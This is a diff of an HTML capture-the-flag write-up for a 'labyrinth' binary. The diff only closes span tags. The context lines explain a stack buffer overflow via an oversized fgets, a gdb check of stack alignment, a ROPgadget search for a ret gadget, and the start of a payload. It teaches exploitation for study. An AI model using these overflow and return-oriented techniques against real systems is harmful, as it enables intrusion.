@@ -88,7 +88,7 @@ RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 
 <span class="code-magenta">Would you like to change the door you chose?</span>
 
-<span class="code-magenta">&gt;&gt;
+<span class="code-magenta">&gt;&gt;</span>
 </code></pre></div><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>The binary is vulnerable to Buffer Overflow since there is a variable called <code>data</code> that has 32 bytes assigned as buffer, but the program is using <code>fgets(data, 68, stdin)</code> and reads up to 68 bytes from <code>stdin</code>, thus overflowing the reserved buffer if the size of the input data is greater than 32 bytes.</p><p>We can check that it crashes in this situation:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./labyrinth</span>
 
 <span class="code-magenta">▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span>
@@ -281,7 +281,7 @@ Starting program: ./labyrinth
 <span class="code-green">gef➤  </span>p/x $rsp
 $2 = 0x7ffe79e99be8
 </code></pre></div><p>This instruction requires the stack to be aligned to 16 bits (that is, the value of <code>$rsp</code> must end in <code>0</code> and thus be a multiple of 16). We can solve this stack alignment issue by using a <code>ret</code> gadget right before calling <code>escape_plan</code>. We can use <code>ROPgadget</code> for that:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">labyrinth</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': ret$'</span>  
-0x0000000000401016 <span class="code-red">: ret
+0x0000000000401016 <span class="code-red">: ret</span>
 </code></pre></div><p>Setting this value in the payload will do the trick:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">401016</span>
 
 <span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
